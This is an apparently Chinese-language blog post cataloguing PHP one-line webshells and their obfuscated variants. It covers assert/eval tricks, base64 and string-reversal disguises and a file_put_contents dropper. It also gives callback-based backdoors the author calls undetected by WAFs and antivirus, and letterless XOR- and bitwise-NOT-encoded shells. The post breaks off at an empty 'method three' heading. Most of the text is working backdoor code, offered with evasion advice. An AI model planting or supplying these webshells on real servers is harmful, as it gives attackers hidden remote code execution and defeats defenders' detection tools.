<h3 id="php7中的assert"><a class="markdownIt-Anchor" href="#php7中的assert">#</a> php7 中的 assert</h3>
<p>php5 中 assert 是一个函数，我们可以通过 <code>$f='assert';$f(...);</code>  这样的方法来动态执行任意代码。</p>
<p>但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222160846771.png" alt="image-20221222160846771"></p>
<p>而 eval 终究还是你 eval，永远是语言构造器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(string `$code`): </span><br></pre></td></tr></table></figure>
<p>把字符串  <code>code</code>  作为 PHP 代码执行。</p>
<p><strong>注意</strong>：因为是语言构造器而不是函数，不能被 <span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLnZhcmlhYmxlLWZ1bmN0aW9ucy5waHA=">可变函数</span> 或者 <span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb25zLmFyZ3VtZW50cy5waHAjZnVuY3Rpb25zLm5hbWVkLWFyZ3VtZW50cw==">命名参数</span> 调用。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uZXZhbA==">PHP: eval - Manual</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uYXNzZXJ0LnBocA==">PHP: assert - Manual</span></p>
<h2 id="php-一句话木马变形"><a class="markdownIt-Anchor" href="#php-一句话木马变形">#</a> php 一句话木马变形</h2>
<p><strong>php 变量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a = &quot;assert&quot;;</span><br><span class="line">$a(@$_POST[&#x27;shell&#x27;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>php 变量简单变形 1</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a=&quot;TR&quot;.&quot;Es&quot;.&quot;sA&quot;;  </span><br><span class="line">$b=strtolower($a);  </span><br><span class="line">$c=strrev($b);  </span><br><span class="line">@$c($_POST[&#x27;shell&#x27;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>php 变量简单变形 2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$a=&quot;AssERT&quot;;  </span><br><span class="line">$b=strtolower($a);  </span><br><span class="line">@$b($_POST[&#x27;shell&#x27;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>PHP 可变变量</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$bb=&quot;assert&quot;;</span><br><span class="line">$a=&#x27;bb&#x27;;</span><br><span class="line">$&#123;$a&#125;($_POST[&#x27;shell&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>自定义函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;  </span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$a</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">@<span class="title function_ invoke__">fun</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>create_function 函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="variable">$fun</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>call_user_func () 函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">call_user_func</span>(assert,<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>call_user_func () 函数的第一个参数是被调动的函数，剩下的参数（可有多个参数）是被调用函数的参数</p>
<p><strong>base64_decode 函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;YXNzZXJ0&quot;</span>);  </span><br><span class="line">@<span class="title function_ invoke__">a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>preg_replace 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">    function fun()&#123;  </span><br><span class="line">        return $_POST[&#x27;shell&#x27;];  </span><br><span class="line">    &#125;  </span><br><span class="line">    @preg_replace(&quot;/test/e&quot;, fun(), &quot;test123&quot;);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>preg_replace</code>  函数一个参数是一个正则表达式，按照 php 的格式，表达式在两个 / 之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php 代码执行。</p>
<p><strong>pares_str 函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=&quot;a=assert&quot;;</span><br><span class="line">parse_str($str);</span><br><span class="line">$a($_POST[&#x27;shell&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>执行 pares_str 函数后可以生成一个名为 $a，值为 &quot;assert&quot; 的变量。</p>
<p><strong>str_replace 函数</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;astestsert&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>file_put_contents 函数</strong></p>
<p>利用函数生成木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test=&#x27;&lt;?php $a=$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#x27;;</span><br><span class="line">file_put_contents(&quot;Trojan.php&quot;, $test);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>array 数组</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&#x27;assert&#x27;;</span><br><span class="line">array_map(&quot;$a&quot;,$_REQUEST);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>上述定义参数 a 并赋值‘assert’, 利用 array_map () 函数将执行语句进行拼接。最终实现 <code>assert（$_REQUEST）</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$item[&#x27;JON&#x27;]=&#x27;assert&#x27;;</span><br><span class="line">$array[]=$item;</span><br><span class="line">$array[0][&#x27;JON&#x27;]($_POST[&quot;TEST&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用函数的组合效果，使得多个参数在传递后组合成一段命令并执行。</p>
<p><strong>&quot;.&quot; 操作符</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;e&quot;.&quot;v&quot;;</span><br><span class="line">$b=&quot;a&quot;.&quot;l&quot;;</span><br><span class="line">$c=$a.$b;</span><br><span class="line">$c($_POST[&#x27;a&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><strong>利用 script 代替 <code>&lt;? 、?&gt;</code>  标签</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;@eval_r($_GET[b])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80OTQ3MjY0OC9hcnRpY2xlL2RldGFpbHMvMTI1OTQ1NTE0">eval 与 assert 一句话木马分析_共黄昏的博客 - CSDN 博客_php assert 一句话</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2J5bGZzai9hcnRpY2xlL2RldGFpbHMvMTAxMjI3MjEwP3NwbT0xMDAxLjIxMDEuMzAwMS42NjUwLjEmYW1wO3V0bV9tZWRpdW09ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yfmRlZmF1bHR+Q1RSTElTVH5SYXRlLTEtMTAxMjI3MjEwLWJsb2ctMTI1OTQ1NTE0LnBjX3JlbGV2YW50X211bHRpX3BsYXRmb3JtX3doaXRlbGlzdHYzJmFtcDt1dG1fcmVsZXZhbnRfaW5kZXg9Mg==">php 一句话木马变形技巧_bylfsj 的博客 - CSDN 博客_一句话木马 phpinfo</span></p>
<h2 id="bypass各种waf-php回调后门"><a class="markdownIt-Anchor" href="#bypass各种waf-php回调后门">#</a> bypass 各种 waf-php 回调后门</h2>
<h3 id="0x01-最初的回调后门"><a class="markdownIt-Anchor" href="#0x01-最初的回调后门">#</a> 0x01 最初的回调后门</h3>
<p>php 中 call_user_func 是执行回调函数的标准方法，这也是一个比较老的后门了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>
<p>这样的后门很容易被查杀，所以我们可以简单做一个变型</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(&#x27;assert&#x27;, array($_REQUEST[&#x27;pass&#x27;]));</span><br></pre></td></tr></table></figure>
<p>call_user_func_array 函数，和 call_user_func 类似，只是第二个参数可以传入参数列表组成的数组。</p>
<h3 id="0x02-数组操作造成的单参数回调后门"><a class="markdownIt-Anchor" href="#0x02-数组操作造成的单参数回调后门">#</a> 0x02 数组操作造成的单参数回调后门</h3>
<p>进一步思考，在平时的 php 开发中，遇到过的带有回调参数的函数绝不止上面说的两个。这些含有回调（callable 类型）参数的函数，其实都有做 “回调后门” 的潜力。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class="line">array_filter($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p>array_filter 函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用都可以执行</p>
<p>类似 array_filter，array_map 也有同样功效：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class="line">array_map(base64_decode($e), $arr);</span><br></pre></td></tr></table></figure>
<h3 id="0x03-php548中的assert"><a class="markdownIt-Anchor" href="#0x03-php548中的assert">#</a> 0x03 php5.4.8 + 中的 assert</h3>
<p>php 5.4.8 + 后的版本，assert 函数由一个参数，增加了一个可选参数 descrition：</p>
<p>这就增加（改变）了一个很好的 “执行代码” 的方法 assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。</p>
<p>比如如下回调后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);</span><br><span class="line">uasort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>
<p>同样的道理，这个也是功能类似：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2);</span><br><span class="line">uksort($arr, $e);</span><br></pre></td></tr></table></figure>
<p>再给出这两个函数，面向对象的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// way 0</span><br><span class="line">$arr = new ArrayObject(array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]));</span><br><span class="line">$arr-&gt;uasort(&#x27;assert&#x27;);</span><br><span class="line"></span><br><span class="line">// way 1</span><br><span class="line">$arr = new ArrayObject(array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2));</span><br><span class="line">$arr-&gt;uksort(&#x27;assert&#x27;);</span><br></pre></td></tr></table></figure>
<p>再来两个类似的回调后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array(1);</span><br><span class="line">array_reduce($arr, $e, $_POST[&#x27;pass&#x27;]);</span><br><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array($_POST[&#x27;pass&#x27;]);</span><br><span class="line">$arr2 = array(1);</span><br><span class="line">array_udiff($arr, $arr2, $e);</span><br></pre></td></tr></table></figure>
<p>以上几个都是可以直接菜刀连接的一句话，但目标 PHP 版本在 5.4.8 及以上才可用。</p>
<p>我把上面几个类型归为：二参数回调函数（也就是回调函数的格式是需要两个参数的）</p>
<h3 id="0x04-三参数回调函数"><a class="markdownIt-Anchor" href="#0x04-三参数回调函数">#</a> 0x04 三参数回调函数</h3>
<p>有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如 array_walk。</p>
<p>array_walk 的第二个参数是 callable 类型，正常情况下它是格式是两个参数的，但在 0x03 中说了，两个参数的回调后门需要使用 php5.4.8 后的 assert，在 5.3 就不好用了。但这个回调其实也可以接受三个参数，那就好办了：</p>
<p>php 中，可以执行代码的函数：</p>
<ol>
<li>一个参数：assert</li>
<li>两个参数：assert （php5.4.8+）</li>
<li>三个参数：preg_replace /e 模式</li>
</ol>
<p>三个参数可以用 preg_replace。所以我这里构造了一个 array_walk + preg_replace 的回调后门：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class="line">array_walk($arr, $e, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>
<p>PHP 拥有那么多灵活的函数，稍微改个函数（array_walk_recursive）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class="line">array_walk_recursive($arr, $e, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>
<p>其实 php 里不止这个函数可以执行 eval 的功能，还有几个类似的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mb_ereg_replace(&#x27;.*&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;, &#x27;e&#x27;);</span><br></pre></td></tr></table></figure>
<p>另一个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo preg_filter(&#x27;|.*|e&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;);</span><br></pre></td></tr></table></figure>
<h3 id="0x05-单参数后门终极奥义"><a class="markdownIt-Anchor" href="#0x05-单参数后门终极奥义">#</a> 0x05 单参数后门终极奥义</h3>
<p>preg_replace、三参数后门虽然好用，但 /e 模式 php5.5 以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。</p>
<p>这里给出几个好用不杀的回调后门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">register_shutdown_function($e, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>
<p>这个是 php 全版本支持的，且不报不杀稳定执行：</p>
<p>再来一个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class="line">declare(ticks=1);</span><br><span class="line">register_tick_function ($e, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>
<p>再来两个：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">filter_var($_REQUEST[&#x27;pass&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));</span><br><span class="line">filter_var_array(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;)));</span><br></pre></td></tr></table></figure>
<p>这两个是 filter_var 的利用，php 里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且 option 为 assert 即可。</p>
<p>这几个单参数回调后门非常隐蔽，基本没特征</p>
<h3 id="0x06-其他参数型回调后门"><a class="markdownIt-Anchor" href="#0x06-其他参数型回调后门">#</a> 0x06 其他参数型回调后门</h3>
<p>上面说了，回调函数格式为 1、2、3 参数的时候，可以利用 assert、assert、preg_replace 来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？</p>
<p>举个例子，php5.5 以后建议用 preg_replace_callback 代替 preg_replace 的 /e 模式来处理正则执行替换，那么其实 preg_replace_callback 也是可以构造回调后门的。</p>
<p>preg_replace_callback 的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为 assert，就会执行不了，因为 assert 接受的参数是字符串。</p>
<p>所以我们需要去 “构造” 一个满足条件的回调函数。</p>
<p>怎么构造？使用 create_function：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace_callback(&#x27;/.+/i&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;), $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>
<p>“创造” 一个函数，它接受一个数组，并将数组的第一个元素 $arr [0] 传入 assert。</p>
<p>这也是一个不杀不报稳定执行的回调后门，但因为有 create_function 这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。</p>
<p>类似的，这个也同样：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mb_ereg_replace_callback(&#x27;.+&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;), $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>
<h2 id="一些不包含数字和字母的webshell"><a class="markdownIt-Anchor" href="#一些不包含数字和字母的webshell">#</a> 一些不包含数字和字母的 webshell</h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;</span><br><span class="line">  eval($_GET[&#x27;shell&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>核心思路是，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行之即可。</p>
<p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p>
<p>不过在此之前，我需要说说 php5 和 7 的差异。</p>
<p>php5 中 assert 是一个函数，我们可以通过 <code>$f='assert';$f(...);</code>  这样的方法来动态执行任意代码。</p>
<p>但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用 file_put_contents 函数，同样可以用来 getshell。</p>
<h3 id="方法一"><a class="markdownIt-Anchor" href="#方法一">#</a> 方法一</h3>
<p>这是最简单、最容易想到的方法。在 PHP 中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到 a-z 中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;</span><br><span class="line">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;</span><br><span class="line">$___=$$__;</span><br><span class="line">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161730587.png" alt="image-20221222161730587"></p>
<h3 id="方法二"><a class="markdownIt-Anchor" href="#方法二">#</a> 方法二</h3>
<p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的 “异或”，方法二使用的是位运算里的 “取反”。</p>
<p>方法二利用的是 UTF-8 编码的某个汉字，并将其中某个字符取出来，比如 <code>'和'&#123;2&#125;</code>  的结果是 <code>&quot;\x8c&quot;</code> ，其取反即为字母 <code>s</code> ：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161822603.png" alt="image-20221222161822603"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);</span><br><span class="line">$_=$__/$__;</span><br><span class="line"></span><br><span class="line">$____=&#x27;&#x27;;</span><br><span class="line">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class="line"></span><br><span class="line">$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class="line"></span><br><span class="line">$_=$$_____;</span><br><span class="line">$____($_[$__]);</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161952864.png" alt="image-20221222161952864"></p>
<p>这个答案还利用了 PHP 的弱类型特性。因为要获取 <code>'和'&#123;2&#125;</code> ，就必须有数字 2。而 PHP 由于弱类型这个特性，true 的值为 1，故 <code>true+true==2</code> ，也就是 <code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code> 。</p>
<h3 id="方法三"><a class="markdownIt-Anchor" href="#方法三">#</a> 方法三</h3>
